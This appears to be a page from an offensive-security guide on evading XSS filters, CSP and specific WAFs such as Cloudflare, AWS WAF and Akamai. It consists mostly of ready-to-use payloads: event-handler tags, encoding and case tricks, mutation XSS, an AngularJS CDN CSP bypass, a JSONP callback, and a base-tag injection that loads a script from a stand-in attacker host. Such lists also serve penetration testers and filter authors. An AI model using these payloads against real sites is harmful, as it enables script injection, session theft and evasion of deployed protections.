# XSS Bypasses

Your payload is blocked. Here's how to get around it.

## Identify What's Blocked

Before trying random bypasses:

1. Test what characters are filtered: `< > " ' / \ ( ) ; =`
2. Test what keywords are filtered: `script`, `on*`, `javascript`
3. Test encoding acceptance
4. Check if filter is server-side or client-side

## Character Filters

### `<>` Blocked

If you're inside an attribute:

```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)
```

Inside JS string:

```javascript
"-alert(1)-"
'-alert(1)-'
```

### `"` Blocked

```html
' onmouseover='alert(1)
```

Or use backticks in JS:

```javascript
`${alert(1)}`
```

### `()` Blocked

```javascript
alert`1`
setTimeout`alert\x281\x29`
location='javascript:alert\x281\x29'
onerror=alert;throw 1
```

### Spaces Blocked

```html
<svg/onload=alert(1)>
<img/src/onerror=alert(1)>
```

Use tabs or newlines:

```html
<svg	onload=alert(1)>
<svg
onload=alert(1)>
```

## Keyword Filters

### `script` Blocked

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe onload=alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
```

### `alert` Blocked

```javascript
confirm(1)
prompt(1)
console.log(1)
eval('ale'+'rt(1)')
window['ale'+'rt'](1)
this['ale'+'rt'](1)
[]['constructor']['constructor']('alert(1)')()
```

### `on*` Events Blocked

Try less common events:

```html
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributename=x>
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>
```

Or different context:

```html
<a href=javascript:alert(1)>click</a>
<form action=javascript:alert(1)><button>submit</button></form>
```

## Encoding Bypasses

### URL Encoding

```
%3Cscript%3Ealert(1)%3C/script%3E
```

### Double URL Encoding

```
%253Cscript%253Ealert(1)%253C/script%253E
```

### HTML Entities

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

### Unicode Escapes (in JS)

```javascript
\u0061\u006c\u0065\u0072\u0074(1)  // alert(1)
```

### Hex Escapes (in JS)

```javascript
\x61\x6c\x65\x72\x74(1)  // alert(1)
```

### Mixed Encoding

```html
<img src=x onerror="\u0061lert(1)">
```

## Case Manipulation

```html
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=x ONERROR=alert(1)>
<iMg SrC=x OnErRoR=alert(1)>
```

## Null Bytes / Comments

```html
<scr%00ipt>alert(1)</script>
<script>al/**/ert(1)</script>
<script>alert(1/**/)</script>
```

## CSP Bypasses

### Check CSP First

Look at `Content-Security-Policy` header. Common weaknesses:

### `unsafe-inline` Present

```html
<script>alert(1)</script>
```

### `unsafe-eval` Present

```javascript
eval('alert(1)')
```

### Whitelisted CDN

If `*.googleapis.com` or similar CDN allowed:

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

### JSONP Endpoints

```html
<script src="https://allowed-domain.com/api?callback=alert(1)//"></script>
```

### Base Tag Injection

```html
<base href="https://attacker.com/">
<script src="/malicious.js"></script>
```

### Missing `script-src`

CSP without `script-src` falls back to `default-src`. If `default-src` allows something useful, exploit it.

## WAF-Specific

### Cloudflare

```html
<svg onload=alert(1)> <!-- Usually blocked -->
<details/open/ontoggle=alert(1)>  <!-- Try this -->
<svg/onload=\u0061lert(1)>
```

### AWS WAF

```html
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
```

### Akamai

```html
<video><source onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
```

### ModSecurity

```html
<svg/onload=alert(String.fromCharCode(88,83,83))>
```

## Advanced Techniques

### Mutation XSS (mXSS)

Browser parsing quirks:

```html
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### Prototype Pollution to XSS

If prototype pollution exists:

```javascript
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
```

### DOM Clobbering

```html
<form id=x><input id=y></form>
<script>x.y.value // controllable</script>
```

---

Still blocked? Sometimes the bypass is in the [delivery method](exploit.md#delivery-methods) not the payload.

Got execution? Move to [Escalation](escalate.md).
